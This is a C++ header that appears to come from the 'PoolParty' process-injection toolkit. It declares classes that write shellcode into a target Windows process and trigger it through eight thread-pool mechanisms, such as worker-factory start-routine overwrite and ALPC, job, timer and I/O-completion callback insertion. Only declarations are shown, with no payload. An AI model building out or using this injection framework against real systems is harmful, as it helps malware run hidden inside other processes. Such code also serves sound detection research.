#pragma once

#include <boost/log/core.hpp>
#include <boost/log/trivial.hpp>
#include <boost/log/expressions.hpp> 
#include <boost/format.hpp>
#include <boost/log/utility/setup/console.hpp>
#include <boost/log/utility/setup/common_attributes.hpp>

#include <codecvt>

#include <Windows.h>

#include "Misc.hpp"
#include "Native.hpp"
#include "WorkerFactory.hpp"
#include "ThreadPool.hpp"
#include "WinApi.hpp"
#include "HandleHijacker.hpp"

namespace logging = boost::log;
namespace keywords = boost::log::keywords;

#define POOL_PARTY_ALPC_PORT_NAME L"\\RPC Control\\PoolPartyALPCPort"
#define POOL_PARTY_EVENT_NAME L"PoolPartyEvent"
#define POOL_PARTY_FILE_NAME L"PoolParty_invitation.txt"
#define POOL_PARTY_JOB_NAME L"PoolPartyJob"

#define INIT_UNICODE_STRING(str) { sizeof(str) - sizeof((str)[0]), sizeof(str) - sizeof((str)[0]), const_cast<PWSTR>(str) }

/*
TODO: 
Fix design, winapi call wrappers should only handle errors via a generic template
and then util functions for nicer usage should be created on top of those templates
*/

typedef struct _POOL_PARTY_CMD_ARGS
{
	BOOL bDebugPrivilege;
	int VariantId;
	int TargetPid;
} POOL_PARTY_CMD_ARGS, * PPOOL_PARTY_CMD_ARGS;

class PoolParty
{
protected:
	DWORD m_dwTargetPid;
	std::shared_ptr<HANDLE> m_p_hTargetPid;
	unsigned char* m_cShellcode;
	SIZE_T m_szShellcodeSize;
	PVOID m_ShellcodeAddress;
public:
	PoolParty(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	std::shared_ptr<HANDLE> GetTargetProcessHandle() const;
	std::shared_ptr<HANDLE> GetTargetThreadPoolWorkerFactoryHandle() const;
	WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation(HANDLE hWorkerFactory) const;  // TODO: This method should be implemented somewhere else
	std::shared_ptr<HANDLE> GetTargetThreadPoolIoCompletionHandle() const;
	virtual LPVOID AllocateShellcodeMemory() const;
	void WriteShellcode() const;
	virtual void SetupExecution() const PURE;
	void Inject();
	virtual ~PoolParty() = default;
};

class AsynchronousWorkItemInsertion : public PoolParty {
protected:
	std::shared_ptr<HANDLE> m_p_hIoCompletion;
public:
	AsynchronousWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	virtual void SetupExecution() const PURE;
	virtual ~AsynchronousWorkItemInsertion() = default;
};

class WorkerFactoryStartRoutineOverwrite : public PoolParty {
protected:
	std::shared_ptr<HANDLE> m_p_hWorkerFactory;
	WORKER_FACTORY_BASIC_INFORMATION m_WorkerFactoryInformation;
public:
	WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	LPVOID AllocateShellcodeMemory() const override;
	void SetupExecution() const override;
	~WorkerFactoryStartRoutineOverwrite() override = default;
};

class RemoteWorkItemInsertion : public PoolParty {
public:
	RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteWorkItemInsertion() override = default;
};

class RemoteWaitCallbackInsertion : public AsynchronousWorkItemInsertion {
public:
	RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteWaitCallbackInsertion() override = default;
};

class RemoteIoCompletionCallbackInsertion : public AsynchronousWorkItemInsertion {
public:
	RemoteIoCompletionCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteIoCompletionCallbackInsertion() override = default;
};

class RemoteAlpcCallbackInsertion : public AsynchronousWorkItemInsertion {
public:
	RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteAlpcCallbackInsertion() override = default;
};

class RemoteJobCallbackInsertion : public AsynchronousWorkItemInsertion {
public:
	RemoteJobCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteJobCallbackInsertion() override = default;
};

class RemoteDirectCallbackInsertion : public AsynchronousWorkItemInsertion {
public:
	RemoteDirectCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteDirectCallbackInsertion() override = default;
};

class RemoteTimerCallbackInsertion : public PoolParty {
public:
	RemoteTimerCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteTimerCallbackInsertion() override = default;
};